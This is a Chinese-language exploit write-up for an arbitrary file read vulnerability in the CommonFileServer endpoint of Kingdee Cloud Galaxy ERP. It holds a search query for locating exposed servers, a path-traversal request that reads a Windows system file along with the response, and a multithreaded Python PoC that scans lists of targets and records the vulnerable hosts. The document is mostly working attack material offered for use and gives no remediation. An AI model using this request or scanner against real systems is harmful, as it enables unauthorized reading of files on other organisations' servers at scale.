# 金蝶云星空 CommonFileserver 任意文件读取漏洞

## 漏洞描述

金蝶云星空是金蝶集团面向大中型企业的一个核心产品，聚焦多组织，多利润中心的企业。它以“开放、标准、社交”三大特性为数字经济时代的企业提供开放的ERP云平台。该产品CommonFileServer存在任意文件读取漏洞。

## 搜索语法

```plain
title="金蝶云星空 管理中心"
```

## 漏洞复现

```plain
GET /CommonFileServer/c:/windows/win.ini HTTP/1.1
Host: 127.0.0.1
accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

响应包如下：

```plain
HTTP/1.1 200 OK
Cache-Control: private
Pragma: public
Content-Length: 167
Content-Type: application/x-zip-compressed; charset=utf-8
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=win.ini
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Thu, 13 Jun 2024 13:38:51 GMT

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
CMCDLLNAME32=mapi32.dll
CMC=1
MAPIX=1
MAPIXVER=1.0.0.1
OLEMessaging=1
```

![image](https://mazha.oss-cn-beijing.aliyuncs.com/img/202409132008658.png)

### poc脚本

~~~markdown
#导包
import argparse,sys,requests,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()   #解除警告

GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'
def banner():
    banner = '''         
██╗  ██╗ █████╗  ██████╗██╗  ██╗    ██████╗ ██╗   ██╗    ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ 
██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗╚══███╔╝██║  ██║██╔══██╗
███████║███████║██║     █████╔╝     ██████╔╝ ╚████╔╝     ██╔████╔██║███████║  ███╔╝ ███████║███████║
██╔══██║██╔══██║██║     ██╔═██╗     ██╔══██╗  ╚██╔╝      ██║╚██╔╝██║██╔══██║ ███╔╝  ██╔══██║██╔══██║
██║  ██║██║  ██║╚██████╗██║  ██╗    ██████╔╝   ██║       ██║ ╚═╝ ██║██║  ██║███████╗██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═════╝    ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝           
                  version:1.0.0
                  author:mazha.top
'''
    print(banner)
def poc(target):
    url = target+"/CommonFileServer/c:/windows/win.ini"
    headers={
            "accept": "*/*",
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Accept-Encoding":"gzip, deflate",
            "Accept-Language":"zh-CN,zh;q=0.9",
            }
    res = ""
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=5)
        if res.status_code==200 and "MAPI" in res.text:
            print(f"[+] {GREEN}存在漏洞{target}\n{RESET}")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-] 不存在漏洞")
    except:
        print(f"[*]无法访问")
def main():
    banner()
    #处理命令行参数
    parser = argparse.ArgumentParser(description='')
    #添加两个参数
    parser.add_argument('-u','--url',dest='url',type=str,help='urllink')
    parser.add_argument('-f','--file',dest='file',type=str,help='filename.txt(Absolute Path)')
    #调用
    args = parser.parse_args()
    # 处理命令行参数了
    # 如果输入的是 url 而不是 文件 调用poc 不开多线程
    # 反之开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
if __name__ == '__main__':   #主函数入口
    main()     #入口  main()
~~~

